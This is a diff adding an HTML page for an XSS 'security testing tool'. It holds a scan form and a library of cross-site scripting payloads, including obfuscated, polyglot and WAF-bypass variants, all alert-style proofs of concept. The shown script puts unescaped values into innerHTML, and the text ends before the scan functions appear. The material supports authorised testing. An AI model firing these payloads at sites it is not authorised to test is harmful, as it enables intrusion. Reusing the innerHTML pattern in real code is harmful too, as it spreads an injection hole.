@@ -1,0 +1,1368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced XSS Security Testing Tool</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #ff4444;
+            --primary-dark: #cc0000;
+            --secondary: #4444ff;
+            --secondary-dark: #0000cc;
+            --success: #44ff44;
+            --success-dark: #00cc00;
+            --warning: #ffaa00;
+            --warning-dark: #cc8800;
+            --dark-bg: #0c0c0c;
+            --darker-bg: #050505;
+            --card-bg: rgba(20, 20, 20, 0.9);
+            --text: #ffffff;
+            --text-secondary: #ff8888;
+            --border: #ff4444;
+            --border-light: rgba(255, 68, 68, 0.3);
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--dark-bg) 0%, var(--darker-bg) 100%);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            background: var(--card-bg);
+            border: 2px solid var(--border);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 0 40px rgba(255, 68, 68, 0.3);
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+
+        .header {
+            grid-column: 1 / -1;
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 25px;
+            background: rgba(255, 68, 68, 0.1);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--success), var(--warning), var(--primary));
+            animation: headerGlow 3s infinite linear;
+        }
+
+        @keyframes headerGlow {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        .header h1 {
+            color: var(--primary);
+            font-size: 2.8em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px rgba(255, 68, 68, 0.5);
+        }
+
+        .header p {
+            color: var(--text-secondary);
+            font-size: 1.2em;
+        }
+
+        .warning {
+            grid-column: 1 / -1;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 25px 0;
+            text-align: center;
+            font-weight: bold;
+            border: 3px solid var(--text-secondary);
+            animation: pulse 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 20px rgba(255, 68, 68, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(255, 68, 68, 0.8); }
+            100% { box-shadow: 0 0 20px rgba(255, 68, 68, 0.5); }
+        }
+
+        .config-panel {
+            background: linear-gradient(135deg, #2a0f0f 0%, #3d1515 100%);
+            padding: 30px;
+            border-radius: 15px;
+            border: 2px solid var(--border);
+            box-shadow: 0 8px 32px rgba(255, 68, 68, 0.2);
+        }
+
+        .panel-section {
+            background: rgba(255, 68, 68, 0.05);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid var(--border-light);
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            color: var(--primary);
+            font-size: 1.3em;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(20, 0, 0, 0.8);
+            color: var(--text-secondary);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            font-family: 'Consolas', monospace;
+            font-size: 1em;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            border-color: var(--text-secondary);
+            box-shadow: 0 0 0 3px rgba(255, 68, 68, 0.2);
+            outline: none;
+        }
+
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+
+        .test-btn {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+            margin: 5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);
+        }
+
+        .test-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 68, 68, 0.4);
+            background: linear-gradient(135deg, #ff5555 0%, #dd0000 100%);
+        }
+
+        .test-btn.secondary {
+            background: linear-gradient(135deg, var(--secondary) 0%, var(--secondary-dark) 100%);
+            box-shadow: 0 4px 15px rgba(68, 68, 255, 0.3);
+        }
+
+        .test-btn.secondary:hover {
+            box-shadow: 0 6px 20px rgba(68, 68, 255, 0.4);
+        }
+
+        .test-btn.success {
+            background: linear-gradient(135deg, var(--success) 0%, var(--success-dark) 100%);
+            color: #003300;
+            box-shadow: 0 4px 15px rgba(68, 255, 68, 0.3);
+        }
+
+        .test-btn.success:hover {
+            box-shadow: 0 6px 20px rgba(68, 255, 68, 0.4);
+        }
+
+        .test-btn.warning {
+            background: linear-gradient(135deg, var(--warning) 0%, var(--warning-dark) 100%);
+            color: #332200;
+            box-shadow: 0 4px 15px rgba(255, 170, 0, 0.3);
+        }
+
+        .test-btn.warning:hover {
+            box-shadow: 0 6px 20px rgba(255, 170, 0, 0.4);
+        }
+
+        .controls {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 25px 0;
+        }
+
+        .payload-library {
+            grid-column: 1 / -1;
+            margin: 30px 0;
+        }
+
+        .payload-category {
+            margin-bottom: 25px;
+        }
+
+        .category-title {
+            color: var(--primary);
+            font-size: 1.2em;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: rgba(255, 68, 68, 0.1);
+            border-radius: 6px;
+            border-left: 4px solid var(--primary);
+        }
+
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .payload-item {
+            background: rgba(255, 68, 68, 0.05);
+            border: 1px solid var(--border-light);
+            border-radius: 6px;
+            padding: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9em;
+            word-break: break-all;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payload-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 68, 68, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .payload-item:hover::before {
+            left: 100%;
+        }
+
+        .payload-item:hover {
+            background: rgba(255, 68, 68, 0.1);
+            border-color: var(--primary);
+            transform: translateY(-2px);
+        }
+
+        .payload-item.critical {
+            border-color: #ff0000;
+            background: rgba(255, 0, 0, 0.1);
+        }
+
+        .results {
+            grid-column: 1 / -1;
+            margin-top: 40px;
+        }
+
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .result-stats {
+            display: flex;
+            gap: 20px;
+            color: var(--text-secondary);
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2em;
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        .result-card {
+            background: rgba(255, 68, 68, 0.05);
+            border: 1px solid var(--border-light);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            transition: all 0.3s ease;
+        }
+
+        .result-card.vulnerable {
+            border-color: #ff0000;
+            background: rgba(255, 0, 0, 0.1);
+            animation: glow 2s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 10px rgba(255, 0, 0, 0.3); }
+            to { box-shadow: 0 0 20px rgba(255, 0, 0, 0.6); }
+        }
+
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .result-title {
+            color: var(--primary);
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+
+        .result-status {
+            background: var(--primary);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: bold;
+        }
+
+        .result-status.vulnerable {
+            background: #ff0000;
+            animation: pulse 1.5s infinite;
+        }
+
+        .result-details {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 10px;
+            border: 1px solid var(--border-light);
+        }
+
+        .detail-item {
+            margin-bottom: 8px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .detail-label {
+            color: var(--text-secondary);
+            font-weight: bold;
+            min-width: 120px;
+        }
+
+        .detail-value {
+            color: var(--text);
+            font-family: 'Consolas', monospace;
+            word-break: break-all;
+            flex: 1;
+        }
+
+        .payload-preview {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 10px;
+            margin-top: 10px;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .tab-container {
+            margin: 20px 0;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid var(--border);
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab {
+            padding: 12px 24px;
+            background: rgba(255, 68, 68, 0.1);
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-radius: 6px 6px 0 0;
+            margin-right: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tab.active {
+            background: var(--primary);
+            color: white;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .advanced-options {
+            background: rgba(255, 68, 68, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            border: 1px solid var(--border-light);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .dashboard-card {
+            background: rgba(255, 68, 68, 0.05);
+            border: 1px solid var(--border-light);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .dashboard-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(255, 68, 68, 0.2);
+        }
+
+        .dashboard-icon {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+
+        .dashboard-value {
+            font-size: 2em;
+            font-weight: bold;
+            color: var(--primary);
+            margin: 10px 0;
+        }
+
+        .dashboard-label {
+            color: var(--text-secondary);
+            font-size: 0.9em;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(255, 68, 68, 0.2);
+            border-radius: 4px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+
+        .custom-payloads {
+            margin-top: 30px;
+        }
+
+        .custom-payload-input {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .custom-payload-input input {
+            flex: 1;
+        }
+
+        .saved-payloads {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .saved-payload {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid var(--border-light);
+            border-radius: 6px;
+            padding: 8px 12px;
+            font-size: 0.9em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .saved-payload .remove {
+            color: var(--primary);
+            cursor: pointer;
+        }
+
+        .export-options {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .report-section {
+            margin-top: 30px;
+        }
+
+        .report-actions {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .history-panel {
+            margin-top: 30px;
+        }
+
+        .history-list {
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid var(--border-light);
+            border-radius: 8px;
+            padding: 10px;
+        }
+
+        .history-item {
+            padding: 10px;
+            border-bottom: 1px solid var(--border-light);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .history-item:hover {
+            background: rgba(255, 68, 68, 0.05);
+        }
+
+        .history-item:last-child {
+            border-bottom: none;
+        }
+
+        .collapsible {
+            margin-bottom: 15px;
+        }
+
+        .collapsible-header {
+            background: rgba(255, 68, 68, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid var(--border-light);
+        }
+
+        .collapsible-content {
+            padding: 15px;
+            border: 1px solid var(--border-light);
+            border-top: none;
+            border-radius: 0 0 8px 8px;
+            display: none;
+        }
+
+        .collapsible.active .collapsible-content {
+            display: block;
+        }
+
+        .tooltip {
+            position: relative;
+            display: inline-block;
+        }
+
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: var(--dark-bg);
+            color: var(--text);
+            text-align: center;
+            border-radius: 6px;
+            padding: 10px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -100px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            border: 1px solid var(--border);
+        }
+
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        @media (max-width: 1200px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .controls {
+                flex-direction: column;
+            }
+            
+            .test-btn {
+                width: 100%;
+            }
+            
+            .payload-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-shield-alt"></i> Advanced XSS Security Testing Tool</h1>
+            <p>Comprehensive Cross-Site Scripting Vulnerability Scanner with Advanced Features</p>
+        </div>
+
+        <div class="warning">
+            <i class="fas fa-exclamation-triangle"></i>
+            <span>FOR AUTHORIZED SECURITY TESTING ONLY - USE RESPONSIBLY</span>
+            <i class="fas fa-exclamation-triangle"></i>
+        </div>
+
+        <!-- Dashboard -->
+        <div class="dashboard">
+            <div class="dashboard-card">
+                <div class="dashboard-icon"><i class="fas fa-bug"></i></div>
+                <div class="dashboard-value" id="vulnCount">0</div>
+                <div class="dashboard-label">Vulnerabilities Found</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="vulnProgress" style="width: 0%"></div>
+                </div>
+            </div>
+            <div class="dashboard-card">
+                <div class="dashboard-icon"><i class="fas fa-check-circle"></i></div>
+                <div class="dashboard-value" id="testCount">0</div>
+                <div class="dashboard-label">Tests Completed</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="testProgress" style="width: 0%"></div>
+                </div>
+            </div>
+            <div class="dashboard-card">
+                <div class="dashboard-icon"><i class="fas fa-clock"></i></div>
+                <div class="dashboard-value" id="timeElapsed">0s</div>
+                <div class="dashboard-label">Time Elapsed</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" style="width: 100%"></div>
+                </div>
+            </div>
+            <div class="dashboard-card">
+                <div class="dashboard-icon"><i class="fas fa-tachometer-alt"></i></div>
+                <div class="dashboard-value" id="successRate">0%</div>
+                <div class="dashboard-label">Success Rate</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="successProgress" style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Configuration Panel -->
+        <div class="config-panel">
+            <div class="panel-section">
+                <div class="section-title"><i class="fas fa-bullseye"></i> Target Configuration</div>
+                
+                <div class="input-group">
+                    <label for="targetUrl">Target URL</label>
+                    <input type="url" id="targetUrl" placeholder="https://example.com/page?param=test" value="">
+                </div>
+
+                <div class="input-group">
+                    <label for="testParameters">Test Parameters (comma-separated)</label>
+                    <input type="text" id="testParameters" placeholder="q, search, id, name, email" value="q,id,search,name,email,user,param,query">
+                </div>
+
+                <div class="input-group">
+                    <label for="requestMethod">HTTP Method</label>
+                    <select id="requestMethod">
+                        <option value="GET">GET</option>
+                        <option value="POST">POST</option>
+                        <option value="PUT">PUT</option>
+                        <option value="DELETE">DELETE</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="panel-section">
+                <div class="section-title"><i class="fas fa-sliders-h"></i> Testing Options</div>
+                
+                <div class="advanced-options">
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="chkReflected" checked>
+                        <label for="chkReflected">Test Reflected XSS</label>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="chkStored" checked>
+                        <label for="chkStored">Test Stored XSS (if applicable)</label>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="chkDOM" checked>
+                        <label for="chkDOM">Test DOM-based XSS</label>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="chkBlind">
+                        <label for="chkBlind">Test Blind XSS (requires callback URL)</label>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="chkAutoEncode">
+                        <label for="chkAutoEncode">Auto-encode payloads</label>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="chkFuzzParams">
+                        <label for="chkFuzzParams">Fuzz additional parameters</label>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label for="customHeaders">Custom Headers (JSON)</label>
+                    <textarea id="customHeaders" placeholder='{"User-Agent": "XSS-Scanner", "X-Forwarded-For": "test"}'>{
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5"
+}</textarea>
+                </div>
+            </div>
+
+            <div class="controls">
+                <button class="test-btn" onclick="startQuickScan()">
+                    <i class="fas fa-rocket"></i> Quick Scan
+                </button>
+                <button class="test-btn secondary" onclick="startDeepScan()">
+                    <i class="fas fa-search"></i> Deep Scan
+                </button>
+                <button class="test-btn success" onclick="startCustomScan()">
+                    <i class="fas fa-cog"></i> Custom Scan
+                </button>
+                <button class="test-btn warning" onclick="startFuzzing()">
+                    <i class="fas fa-random"></i> Fuzz Parameters
+                </button>
+                <button class="test-btn" onclick="clearResults()">
+                    <i class="fas fa-trash"></i> Clear Results
+                </button>
+            </div>
+        </div>
+
+        <!-- Custom Payloads -->
+        <div class="config-panel">
+            <div class="panel-section">
+                <div class="section-title"><i class="fas fa-code"></i> Custom Payloads</div>
+                
+                <div class="custom-payloads">
+                    <div class="input-group">
+                        <label for="customPayload">Add Custom Payload</label>
+                        <div class="custom-payload-input">
+                            <input type="text" id="customPayload" placeholder="Enter your custom XSS payload">
+                            <button class="test-btn" onclick="addCustomPayload()"><i class="fas fa-plus"></i> Add</button>
+                        </div>
+                    </div>
+                    
+                    <div class="saved-payloads" id="savedPayloads">
+                        <!-- Saved payloads will appear here -->
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel-section">
+                <div class="section-title"><i class="fas fa-history"></i> Scan History</div>
+                
+                <div class="history-panel">
+                    <div class="history-list" id="historyList">
+                        <!-- History items will appear here -->
+                    </div>
+                    <div class="controls" style="margin-top: 15px;">
+                        <button class="test-btn secondary" onclick="clearHistory()">
+                            <i class="fas fa-broom"></i> Clear History
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Payload Library -->
+        <div class="payload-library">
+            <div class="section-title"><i class="fas fa-book"></i> XSS Payload Library</div>
+            
+            <div class="tab-container">
+                <div class="tabs">
+                    <button class="tab active" onclick="switchTab('basic')"><i class="fas fa-star"></i> Basic</button>
+                    <button class="tab" onclick="switchTab('advanced')"><i class="fas fa-cogs"></i> Advanced</button>
+                    <button class="tab" onclick="switchTab('obfuscated')"><i class="fas fa-eye-slash"></i> Obfuscated</button>
+                    <button class="tab" onclick="switchTab('dom')"><i class="fas fa-code-branch"></i> DOM-based</button>
+                    <button class="tab" onclick="switchTab('polyglot')"><i class="fas fa-language"></i> Polyglot</button>
+                    <button class="tab" onclick="switchTab('waf')"><i class="fas fa-shield-alt"></i> WAF Bypass</button>
+                </div>
+
+                <div id="tab-basic" class="tab-content active">
+                    <div class="payload-category">
+                        <div class="category-title">Script Tags</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)"><script>alert(1)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)"><script>alert(document.domain)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)"><script>alert(window.location)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)"><script>prompt(1)</script></div>
+                        </div>
+                    </div>
+
+                    <div class="payload-category">
+                        <div class="category-title">Event Handlers</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)">" onmouseover="alert(1)</div>
+                            <div class="payload-item" onclick="addPayload(this)">' onfocus="alert(1)" autofocus</div>
+                            <div class="payload-item" onclick="addPayload(this)">" onload="alert(1)"</div>
+                            <div class="payload-item" onclick="addPayload(this)">" onerror="alert(1)"</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-advanced" class="tab-content">
+                    <div class="payload-category">
+                        <div class="category-title">SVG & Image Based</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)"><svg onload=alert(1)></div>
+                            <div class="payload-item" onclick="addPayload(this)"><img src=x onerror=alert(1)></div>
+                            <div class="payload-item" onclick="addPayload(this)"><image src=x onerror=alert(1)></div>
+                            <div class="payload-item" onclick="addPayload(this)"><body onload=alert(1)></div>
+                        </div>
+                    </div>
+
+                    <div class="payload-category">
+                        <div class="category-title">Iframe & Object</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)"><iframe src="javascript:alert(1)"></div>
+                            <div class="payload-item" onclick="addPayload(this)"><object data="javascript:alert(1)"></div>
+                            <div class="payload-item" onclick="addPayload(this)"><embed src="javascript:alert(1)"></div>
+                            <div class="payload-item" onclick="addPayload(this)"><base href="javascript:alert(1)//"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-obfuscated" class="tab-content">
+                    <div class="payload-category">
+                        <div class="category-title">Encoding Obfuscation</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)"><img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"></div>
+                            <div class="payload-item" onclick="addPayload(this)"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script></div>
+                            <div class="payload-item" onclick="addPayload(this)">javascript:alert(1)</div>
+                            <div class="payload-item" onclick="addPayload(this)">jav&#x09;ascript:alert(1)</div>
+                        </div>
+                    </div>
+
+                    <div class="payload-category">
+                        <div class="category-title">String Concatenation</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)"><script>window['al'+'ert'](1)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)"><img src=x onerror=eval('al'+'ert(1)')></div>
+                            <div class="payload-item" onclick="addPayload(this)"><script>top['al'+'ert'](1)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)"><script>self['al'+'ert'](1)</script></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-dom" class="tab-content">
+                    <div class="payload-category">
+                        <div class="category-title">DOM XSS Payloads</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)">#<img src=x onerror=alert(1)></div>
+                            <div class="payload-item" onclick="addPayload(this)">javascript:alert(document.domain)</div>
+                            <div class="payload-item" onclick="addPayload(this)">"</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-polyglot" class="tab-content">
+                    <div class="payload-category">
+                        <div class="category-title">Polyglot Payloads</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)">javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'></div>
+                            <div class="payload-item" onclick="addPayload(this)">'">><script>alert(1)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)">'">><marquee><img src=x onerror=alert(1)></marquee></div>
+                            <div class="payload-item" onclick="addPayload(this)">'">><details open ontoggle=alert(1)></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-waf" class="tab-content">
+                    <div class="payload-category">
+                        <div class="category-title">WAF Bypass Techniques</div>
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="addPayload(this)"><script>al\u0065rt(1)</script></div>
+                            <div class="payload-item" onclick="addPayload(this)"><scr<script>ipt>alert(1)</scr</script>ipt></div>
+                            <div class="payload-item" onclick="addPayload(this)"><img src=x oneonerrorrror=alert(1)></div>
+                            <div class="payload-item" onclick="addPayload(this)"><svg/onload=alert`1`></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Results Section -->
+        <div class="results">
+            <div class="results-header">
+                <div class="section-title"><i class="fas fa-chart-bar"></i> Scan Results</div>
+                <div class="result-stats">
+                    <div class="stat-item">
+                        <div class="stat-value" id="totalTests">0</div>
+                        <div>Total Tests</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="vulnerabilities">0</div>
+                        <div>Vulnerabilities</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="successRateValue">0%</div>
+                        <div>Success Rate</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="report-actions">
+                <button class="test-btn secondary" onclick="exportResults('json')">
+                    <i class="fas fa-file-export"></i> Export as JSON
+                </button>
+                <button class="test-btn secondary" onclick="exportResults('csv')">
+                    <i class="fas fa-file-csv"></i> Export as CSV
+                </button>
+                <button class="test-btn secondary" onclick="generateReport()">
+                    <i class="fas fa-file-pdf"></i> Generate Report
+                </button>
+            </div>
+
+            <div id="resultsContainer">
+                <!-- Results will be displayed here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let scanHistory = [];
+        let customPayloads = [];
+        let scanResults = [];
+        let scanStartTime = 0;
+        let totalTests = 0;
+        let completedTests = 0;
+        let vulnerabilitiesFound = 0;
+
+        // Initialize the tool
+        document.addEventListener('DOMContentLoaded', function() {
+            loadHistory();
+            loadCustomPayloads();
+            updateDashboard();
+        });
+
+        // Tab switching function
+        function switchTab(tabName) {
+            // Hide all tab contents
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show the selected tab content
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+            
+            // Activate the clicked tab
+            event.target.classList.add('active');
+        }
+
+        // Add payload to custom payloads
+        function addPayload(element) {
+            const payload = element.textContent.trim();
+            document.getElementById('customPayload').value = payload;
+        }
+
+        // Add custom payload to the list
+        function addCustomPayload() {
+            const payloadInput = document.getElementById('customPayload');
+            const payload = payloadInput.value.trim();
+            
+            if (payload && !customPayloads.includes(payload)) {
+                customPayloads.push(payload);
+                saveCustomPayloads();
+                renderCustomPayloads();
+                payloadInput.value = '';
+            }
+        }
+
+        // Remove custom payload
+        function removeCustomPayload(index) {
+            customPayloads.splice(index, 1);
+            saveCustomPayloads();
+            renderCustomPayloads();
+        }
+
+        // Render custom payloads
+        function renderCustomPayloads() {
+            const container = document.getElementById('savedPayloads');
+            container.innerHTML = '';
+            
+            customPayloads.forEach((payload, index) => {
+                const payloadElement = document.createElement('div');
+                payloadElement.className = 'saved-payload';
+                payloadElement.innerHTML = `
+                    <span>${payload}</span>
+                    <span class="remove" onclick="removeCustomPayload(${index})"><i class="fas fa-times"></i></span>
+                `;
+                container.appendChild(payloadElement);
+            });
+        }
+
+        // Save custom payloads to localStorage
+        function saveCustomPayloads() {
+            localStorage.setItem('xssCustomPayloads', JSON.stringify(customPayloads));
+        }
+
+        // Load custom payloads from localStorage
+        function loadCustomPayloads() {
+            const saved = localStorage.getItem('xssCustomPayloads');
+            if (saved) {
+                customPayloads = JSON.parse(saved);
+                renderCustomPayloads();
+            }
+        }
+
+        // Save scan history
+        function saveHistory() {
+            localStorage.setItem('xssScanHistory', JSON.stringify(scanHistory));
+        }
+
+        // Load scan history
+        function loadHistory() {
+            const saved = localStorage.getItem('xssScanHistory');
+            if (saved) {
+                scanHistory = JSON.parse(saved);
+                renderHistory();
+            }
+        }
+
+        // Render scan history
+        function renderHistory() {
+            const container = document.getElementById('historyList');
+            container.innerHTML = '';
+            
+            if (scanHistory.length === 0) {
+                container.innerHTML = '<div class="history-item">No scan history available</div>';
+                return;
+            }
+            
+            scanHistory.slice().reverse().forEach((item, index) => {
+                const historyItem = document.createElement('div');
+                historyItem.className = 'history-item';
+                historyItem.innerHTML = `
+                    <div><strong>${item.url}</strong></div>
+                    <div>${item.date} - ${item.vulnerabilities} vulnerabilities found</div>
+                `;
+                historyItem.addEventListener('click', () => loadHistoryItem(scanHistory.length - 1 - index));
+                container.appendChild(historyItem);
+            });
+        }
